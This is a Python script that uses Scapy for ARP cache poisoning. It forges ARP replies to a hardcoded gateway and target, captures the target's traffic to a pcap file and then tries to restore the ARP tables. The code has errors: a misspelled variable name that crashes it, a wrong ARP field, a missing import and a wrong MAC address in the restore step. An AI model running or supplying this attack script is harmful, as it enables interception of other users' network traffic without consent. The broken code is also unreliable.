from scapy.all import *
import os, sys, threading, signal

interface = "eth0"
gateway_ip = "172.28.224.1"
target_ip = "172.217.1.3"
packet_count = 1000

def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):

    # sligthly diff method using send
    print("[*] Restoring target...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)

    # signals the main thread to exit
    os.kill(os.getpid(), signal.SIGINT)

def get_mac(ip_address):

    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=2, retry=10)

    # return the MAC address from a response
    for s,r in responses:
        return r[Ether].src
    return None

def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.dst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gatway.op = 2
    poison_gatway.psrc = target_ip
    poison_gatway.pdst = gateway_ip
    poison_gatway.hwdst = gateway_mac

    print("[*] Beginning the ARP poison. [Ctrl-C to stop]")

    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

    print("[*] ARP poison attack finished.")
    return


# set interface
conf.iface = interface

# turn off output
conf.verb = 0

print(f"[*] Setting ip {interface}")

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print("[!!!] Failed to get gateway MAC. Exiting")
    sys.exit(0)
else:
    print(f"[*] Gateway {gateway_ip} is at {gateway_mac}")

target_mac = get_mac(target_ip)

if target_mac is None:
    print("[!!!] Failed to get target MAC. Exiting")
    sys.exit(0)
else:
    print(f"[*] Gateway {target_ip} is at {target_mac}")

# poiso thread
poison_thread = threading.Thread(target=poison_target,args=(gateway_ip,gateway_mac,target_ip,target_mac))
poison_thread.start()

try:
    print(f"[*] Starting sniffer for {packet_count} packets")

    bpf_filter = f"ip host {target_ip}"
    packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)

    # write out captured packets
    wrpcap('arper.pcap',packets)

    # restore the network
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

except KeyboardInterrupt:
    # restore the network
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
    sys.exit(0)
